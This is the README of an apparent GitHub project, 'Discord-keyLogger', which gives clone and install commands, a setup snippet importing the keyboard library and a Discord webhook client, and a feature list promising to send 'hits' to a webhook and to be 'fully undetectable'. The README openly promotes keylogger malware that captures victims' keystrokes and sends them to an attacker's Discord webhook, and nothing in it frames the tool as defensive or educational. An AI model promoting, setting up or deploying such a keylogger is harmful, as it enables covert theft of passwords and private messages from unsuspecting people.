### ☕ Usage
- #### 💻 Installing
    ```
    git clone https://github.com/Plasmonix/Discord-keyLogger
    cd Discord-keyLogger
    pip install -r requirements.txt
    ```
- #### 🛠 Setup
    ```py
    import keyboard,os
    from threading import Timer
    from datetime import datetime
    from discord_webhook import DiscordWebhook, DiscordEmbed
    
    WEBHOOK = "https://discord.com/api/webhooks/..."
    COOLDOWN = 60 #In seconds
    ```
- #### 💣 Execute
    ```
    run main.py
    ```
### 🏆 Features List
- Easy setup
- Send hit to webhook
- Fully undetectable

## 📚 Contributions
All suggestions are welcome.

## 📜 License
This project is licensed under [GNU General Public License](https://github.com/Plasmonix/Discord-keylogger/blob/master/LICENSE).

<p align="center">
  <img src="https://badges.frapsoft.com/os/v1/open-source.svg?v=103" alt="Open Source">
  <img src="https://img.shields.io/badge/contributions-welcome-brightgreen.svg?style=flat" alt="Contribution Welcome">
  <img src="https://img.shields.io/badge/License-GPLv3-blue.svg" alt="License Badge">
</p>